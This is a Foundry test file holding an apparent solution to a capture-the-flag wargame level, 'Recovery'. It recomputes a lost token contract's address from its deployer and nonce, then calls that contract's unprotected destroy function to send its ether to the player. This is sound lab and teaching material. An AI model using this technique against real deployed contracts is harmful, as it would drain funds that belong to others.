// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Recovery, SimpleToken} from "../src/17_Recovery.sol";
import {LOST_TOKEN_ADDR} from "../src/utils/Utils.sol";

contract TestRecovery is Test {
    address public player = address(0xbad);
    Recovery public instance;

    function setUp() public {
        vm.deal(player, 0.001 ether);
        instance = new Recovery();
        instance.generateToken("ETH", 10 * 10e18);
        payable(address(LOST_TOKEN_ADDR)).send(0.001 ether); // you are not suppose to know this!
    }

    function testSolution() public {
        vm.startPrank(player);

        // address 20 bytes -> RLP string 0-55 bytes: [(0x80 + length), string] = 0x80 + 0x14 = [0x94, string]
        // nonce 1byte -> RLP single byte (0-127) = 0x01
        //                                                                      (1b    20b     1b) = 22b
        // RLP lists length < 55 bytes: [0xc + length + RLP(items) = [0xc + 22, 0x94, address, nonce]
        //                                                             0xd6, 0x94, address, 0x1
        address payable lost_address = payable(address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(instance), bytes1(0x01)))))
        ));

        SimpleToken(lost_address).destroy(payable(player));

        vm.stopPrank();

        assertEq(address(LOST_TOKEN_ADDR).balance, 0);
    }
}
